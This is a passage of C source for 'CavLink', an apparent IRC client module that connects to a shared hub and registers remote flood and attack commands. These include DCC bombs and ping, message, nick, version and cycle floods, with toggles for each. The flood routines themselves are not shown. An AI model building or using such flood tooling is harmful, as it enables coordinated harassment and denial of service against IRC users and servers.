		nick = *(ArgList+2);
		host = *(ArgList+3);
		output = cav_say("%s",cparse("%W$1%n!$2%g left%n $0%g","%s %s %s", chan, nick, host));
	}
	else if (!strcmp(comm, "who")) 
		output = handle_who(cavhub, ArgList, 0);
	else if (!strcmp(comm, "rwho")) 
		output = handle_who(cavhub, ArgList, 1);
	else if (!strcmp(comm, "pong"))
	{
		output = cav_say("%s", cparse("ping time from server $0secs", "%d", time(NULL)-cavping));
		cavping = 0;
	}
	else if (!strcmp(comm, "luser"))
	{
		int users = 0, opers = 0, llbots = 0, splits = 0;
		users = my_atol(*(ArgList+1));
		opers = my_atol(*(ArgList+3));
		llbots = my_atol(*(ArgList+5));
		splits = my_atol(*(ArgList+7));
		cav_say("%s",cparse("%W$0%g clients%g (%W$1%n user + %W$2%n oper%g)", "%d %d %d", users, users-opers, opers));
		output = cav_say("%s",cparse("%W$0%g llbots %nconnected%g (%W$1%n servers split%g)", "%d %d", llbots, splits));
	}
	else if (!strcmp(comm, "say"))
		output = handle_say(cavhub, ArgList);
	else if (!strcmp(comm, "msg"))
		output = handle_msg(cavhub, ArgList);
	else if (!strcmp(comm, "join")) 
	{
		char *chan, *nick, *userhost;
		chan=*(ArgList+1);
		nick=*(ArgList+2);
		userhost=*(ArgList+3);
		output = cav_say("%s",cparse("%W$0%n!$1%g has joined%n $2","%s %s %s",nick, userhost, chan));
		if (!my_stricmp(cav_nickname,nick))
			malloc_strcpy(&cav_channel, chan);
	}
	else if (!strcmp(comm, "disconnected")) 
	{
		char *nick, *host, *reason;
		nick=*(ArgList+1);
		host=*(ArgList+2);
		reason = *(ArgList+3);
		PasteArgs(ArgList, 3);
		output = cav_say("%s",cparse("%W$0%n!$1%g disconnected %nfrom caverns","%s %s %s",nick,host,!reason ? "connection lost":reason));
		if (!my_stricmp(nick, cav_nickname))
			cavhub = NULL;
	}
	else if (!strcmp(comm, "version"))
	{
		PasteArgs(ArgList,0); 
		p = *(ArgList+0);
	}
	else if (!strcmp(comm, "stats"))
	{
		PasteArgs(ArgList,0); 
		p = *(ArgList+0);
	}
	else if (!strcmp(comm, "uptime"))
	{
		PasteArgs(ArgList,1);
		output = cav_say("%s", cparse("Cavhub Uptime %R$0-", "%s", *(ArgList+1)));
	}
	else if (!strcmp(comm, "kline"))
	{
		PasteArgs(ArgList,0); 
		p = *(ArgList+0);
	}
	else if (!strcmp(comm, "error:"))
	{
		p=*(ArgList+1);
		PasteArgs(ArgList, 1);
		output = cav_say("%s", cparse("Error: $0-", "%s", p));
	}
	else if (!strcmp(comm, "rwall"))
	{
		char *nick, *host, *str;
		nick = *(ArgList+1);
		host = *(ArgList+2);
		PasteArgs(ArgList, 3);
		str = *(ArgList+3);
		output = cav_say("%s", cparse("%G!%WWALL%G! [%n$0%g(%W$1%g)]%n $2-", "%s %s %s", nick, host, str));
	}
	else if (!strcmp(comm, "nick"))
	{
		char *nick, *newnick;
		nick = *(ArgList+2);
		newnick = *(ArgList+4);
		if (!my_stricmp(nick, cav_nickname))
			malloc_strcpy(&cav_nickname, newnick);
		output = cav_say("%s", cparse("%W$0%n is now known as %W$1", "%s %s", nick, newnick));
	}
	else if (!strcmp(comm, "split"))
		output = handle_split(cavhub, ArgList);
	else if (!strcmp(comm, "attack")) 
	{
		if ((output = handle_attack(cavhub, ArgList)))
		{
			PasteArgs(ArgList, 0);
			p = *(ArgList+0);
		}
	}
	else
	{
		PasteArgs(ArgList, 0);
		p = *ArgList;
	}		
	if (output)
		cav_say(p?p:tmp);
	return;
	}
}
}

SocketList *cavlink_connect(char *host, u_short port)
{
	struct	in_addr	address;
	struct	hostent	*hp;
	int	lastlog_level;

	lastlog_level = set_lastlog_msg_level(LOG_DCC);
	if ((address.s_addr = inet_addr(host)) == -1)
	{
		if (!my_stricmp(host, "255.255.255.0") || !(hp = gethostbyname(host)))
		{
			put_it("%s", cparse("$G %RDCC%n Unknown host: $0-", "%s", host));
			set_lastlog_msg_level(lastlog_level);
			return NULL;
		}
		bcopy(hp->h_addr, (char *)&address, sizeof(address));
	}
	cav_socket = connect_by_number(host, &port, SERVICE_CLIENT, PROTOCOL_TCP, 1);
	if (cav_socket < 0)
		return NULL;
	add_socketread(cav_socket, port, 0, host, cavlink_handler, NULL);
	put_it("%s", cparse(fget_string_var(FORMAT_DCC_CONNECT_FSET), 
		"%s %s %s %s %s %d", update_clock(GET_TIME), "CAV", host, 
		"u@h", ltoa(port), port));
	(void) set_lastlog_msg_level(lastlog_level);
	cavhub = get_socket(cav_socket);
	return cavhub;
}

static char *cavlink (CtcpEntryDll *dll, char *from, char *to, char *args)
{
char *address, *password, *ports;
	int port;
	
	if (cavhub)
	{
		put_it("%s", cparse("$G Already cavlinked %R$0%K:%R$1", "%s:%d", get_dllstring_var("cavlink_host"), get_dllint_var("cavlink_port")));
		return NULL;
	}
	address = next_arg(args, &args);
	if ((ports = next_arg(args, &args)))
	{
		port = atoi(ports);
		if (port < 100)
			return NULL;
		cav_port = port;
	} else 
		port = cav_port;
	if (!(password = next_arg(args, &args)))
		password = get_dllstring_var("cavlink_pass");
	set_dllstring_var("cavlink_host", address);
	if (!get_dllint_var("cavlink"))
		return NULL;

	cavhub = cavlink_connect(address, (unsigned short)port);

	set_dllstring_var("cavlink_pass", password);
	return NULL;
}

static void toggle_cavwin (Window *win, char *unused, int onoff)
{
Window *tmp;
	if (onoff)
	{
		if ((tmp = new_window(win->screen)))
		{
			resize_window(2, tmp, 6);
			tmp->name = m_strdup("CAVLINK");
			set_wset_string_var(tmp->wset, STATUS_FORMAT1_WSET, "[1;45m%>[1;30m[[1;32mCav[1;37mLink[1;30;45m] ");
			tmp->double_status = 0;
			tmp->absolute_size = 1;
			build_status(tmp, NULL, 0);
			update_all_windows();
			set_input_prompt(win, get_string_var(INPUT_PROMPT_VAR), 0);
			set_screens_current_window(tmp->screen, tmp);
			cursor_to_input();

		}
	}
	else
	{
		if ((tmp = get_window_by_name("CAVLINK")))
		{
			delete_window(tmp);
			update_all_windows();
			set_input_prompt(win, get_string_var(INPUT_PROMPT_VAR), 0);
			cursor_to_input();
			                        
		}
	}
}


BUILT_IN_DLL(cavhelp)
{
	put_it("%s", cparse("%KÖÄÄÄ %YCavLink%n module ver %W$0%n %Kby %Ppanasync %KÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ·", "%s", cav_version));
	put_it(      cparse("%Kº [%Wcavlink cavlink_prompt cavlink_window cavlink_pass%K]             º ", NULL, NULL));
	put_it(      cparse("%Kº [%Wcavlink_attack cavlink_attack_times%K]                            º ", NULL, NULL));
	put_it(      cparse("%Kº [%Rcavlink_floodspawn cavlink_floodping%K]                           º ", NULL, NULL));
	put_it(      cparse("%Kº [%Rcavlink_floodquote cavlink_floodmsg%K]                            º ", NULL, NULL));
	put_it(      cparse("%Kº [%Rcavlink_floodnick cavlink_floodversion%K]                         º ", NULL, NULL));
	put_it(      cparse("%Kº [%Rcavlink_flooddccbomb cavlink_floodcycle%K]                        º ", NULL, NULL));

	put_it(      cparse("%Kº [%Wcsay cgeneral clsay cwho cmsg cjoin cpart cping cver cversion%K]  º ", NULL, NULL));
	put_it(      cparse("%Kº [%Wcwall cluser cunlink clink cattack ckline cboot cmode csplit%K]   º ", NULL, NULL));
	put_it(      cparse("%Kº [%Wcpong cinfo cwhois cme cmotd cquit cconnect cdie ckill chelp%K]   º ", NULL, NULL));
	put_it(      cparse("%Kº [%Wcgrab crwho crwall chubs cstats cuptime csave%K]                  º ", NULL, NULL));

	put_it(      cparse("%Kº [%Rcbomb cvfld cpfld cmfld cqfld ccfld cnfld cefld cspawn%K]         º ", NULL, NULL));

	put_it(      cparse("%Kº [%Wcavlink clink%K]                                                  º ", NULL, NULL));
	put_it(      cparse("%KÓÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ½ ", NULL, NULL));

}

BUILT_IN_DLL(cavsave)
{
IrcVariableDll *newv = NULL;
FILE *outf = NULL;
char *expanded = NULL;
char buffer[BIG_BUFFER_SIZE+1];
	if (get_string_var(CTOOLZ_DIR_VAR))
		snprintf(buffer, BIG_BUFFER_SIZE, "%s/CavLink.sav", get_string_var(CTOOLZ_DIR_VAR));
	else
		sprintf(buffer, "~/CavLink.sav");
	expanded = expand_twiddle(buffer);
	if (!expanded || !(outf = fopen(expanded, "w")))
	{
		bitchsay("error opening %s", expanded ? expanded : buffer);
		new_free(&expanded);
		return;
	}
	for (newv = dll_variable; newv; newv = newv->next)
	{
		if (!my_strnicmp(newv->name, "cavlink", 7))
		{
			if (newv->type == STR_TYPE_VAR)
			{
				if (newv->string)
					fprintf(outf, "SET %s %s\n", newv->name, newv->string);
			}
			else
				fprintf(outf, "SET %s %d\n", newv->name, newv->integer);
		}
	}
	cav_say("Finished saving cavlink variables to %s", buffer);
	fclose(outf);	
	new_free(&expanded);
	return;
}

char *Cavlink_Version(IrcCommandDll **intp)
{
	return cav_version;
}

int Cavlink_Init(IrcCommandDll **intp, Function_ptr *global_table)
{
char buffer[BIG_BUFFER_SIZE+1];
char *p;
char cav_name[] = "cavlink";

	initialize_module(cav_name);	

	add_module_proc(COMMAND_PROC, cav_name, "csay", NULL, 0, 0, cavsay, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "clsay", NULL, 0, 0, cavsay, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cgeneral", "cgeneral", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cwho", "cwho", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cmsg", "cmsg", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "chelp", "chelp", 0, 0, cavhelp, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cconnect", "cconnect", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cdie", "cdie", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cquit", "cquit", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cmotd", "cmotd", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cme", "cme", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "crwall", "crwall", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "chubs", "chubs", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cwhois", "cwhois", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "coper", "coper", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cjoin", "cjoin", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cpong", "cpong", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cpart", "cpart", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cping", "cping", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cver", "cver", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cversion", "cversion", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cwall", "cwall", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cluser", "cluser", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "clist", "clist", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "csave", NULL, 0, 0, cavsave, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cunlink", NULL, 0, 0, cunlink, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "clink", NULL, 0, 0, cav_link, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cclose", NULL, 0, 0, cclose, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cattack", "cattack", 0, 0, cattack, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cbomb", "cbomb", 0, 0, cattack, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cvfld", "cvfld", 0, 0, cattack, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cpfld", "cpfld", 0, 0, cattack, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cmfld", "cmfld", 0, 0, cattack, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cqfld", "cqfld", 0, 0, cattack, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "ccfld", "ccfld", 0, 0, cattack, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cnfld", "cnfld", 0, 0, cattack, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cefld", "cefld", 0, 0, cattack, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cspawn", "cspawn", 0, 0, cattack, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "ckline", "ckline", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cnick", "cnick", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cboot", "cboot", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "ckill", "ckill", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "csplit", "csplit", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cstats", "cstats", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cuptime", "cuptime", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "crwho", "crwho", 0, 0, cavgen, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cgrab", NULL, 0, 0, cgrab, NULL);
	add_module_proc(COMMAND_PROC, cav_name, "cmode", NULL, 0, 0, cmode, NULL);

	add_module_proc(CTCP_PROC, cav_name, "cavlink", "CavLinking", -1, CTCP_SPECIAL|CTCP_TELLUSER, cavlink, NULL);
	add_module_proc(CTCP_PROC, cav_name, "clink", "CavLinking", -1, CTCP_SPECIAL|CTCP_TELLUSER, cavlink, NULL);

	add_module_proc(VAR_PROC, cav_name, "cavlink_pass", "boing", STR_TYPE_VAR, 0, NULL, NULL);
	add_module_proc(VAR_PROC, cav_name, "cavlink_prompt", (char *)convert_output_format("%K[%YCavLink%K]%n", NULL, NULL), STR_TYPE_VAR, 0, NULL, NULL);
	add_module_proc(VAR_PROC, cav_name, "cavlink_window", NULL, BOOL_TYPE_VAR, 0, toggle_cavwin, NULL);
	add_module_proc(VAR_PROC, cav_name, "cavlink", NULL, BOOL_TYPE_VAR, 1, NULL, NULL);

	add_module_proc(VAR_PROC, cav_name, "cavlink_floodspawn", NULL, BOOL_TYPE_VAR, 1, NULL, NULL);
	add_module_proc(VAR_PROC, cav_name, "cavlink_floodquote", NULL, BOOL_TYPE_VAR, 0, NULL, NULL);
	add_module_proc(VAR_PROC, cav_name, "cavlink_floodmsg", NULL, BOOL_TYPE_VAR, 1, NULL, NULL);
	add_module_proc(VAR_PROC, cav_name, "cavlink_floodnick", NULL, BOOL_TYPE_VAR, 1, NULL, NULL);
	add_module_proc(VAR_PROC, cav_name, "cavlink_floodversion", NULL, BOOL_TYPE_VAR, 1, NULL, NULL);
	add_module_proc(VAR_PROC, cav_name, "cavlink_floodping", NULL, BOOL_TYPE_VAR, 1, NULL, NULL);
	add_module_proc(VAR_PROC, cav_name, "cavlink_flooddccbomb", NULL, BOOL_TYPE_VAR, 1, NULL, NULL);
	add_module_proc(VAR_PROC, cav_name, "cavlink_floodcycle", NULL, BOOL_TYPE_VAR, 1, NULL, NULL);
	add_module_proc(VAR_PROC, cav_name, "cavlink_floodecho", NULL, BOOL_TYPE_VAR, 1, NULL, NULL);

	add_module_proc(VAR_PROC, cav_name, "cavlink_host", NULL, STR_TYPE_VAR, 0, NULL, NULL);
	add_module_proc(VAR_PROC, cav_name, "cavlink_port", NULL, INT_TYPE_VAR, 7979, NULL, NULL);
	add_module_proc(VAR_PROC, cav_name, "cavlink_attack", NULL, BOOL_TYPE_VAR, 0, NULL, NULL);
	add_module_proc(VAR_PROC, cav_name, "cavlink_attack_times", NULL, INT_TYPE_VAR, 6, NULL, NULL);

	cavhelp(NULL, NULL, NULL, NULL, NULL);
	malloc_strcpy(&cav_nickname,  nickname);
	sprintf(buffer, "$0+cavlink %s by panasync - $2 $3", cav_version);
	fset_string_var(FORMAT_VERSION_FSET, buffer);
	loading_global = 1;
	snprintf(buffer, BIG_BUFFER_SIZE, "%s/CavLink.sav", get_string_var(CTOOLZ_DIR_VAR));
	p  = expand_twiddle(buffer);
	load("LOAD", p, empty_string, NULL);
	new_free(&p);
	loading_global = 0;
	return 0;
}

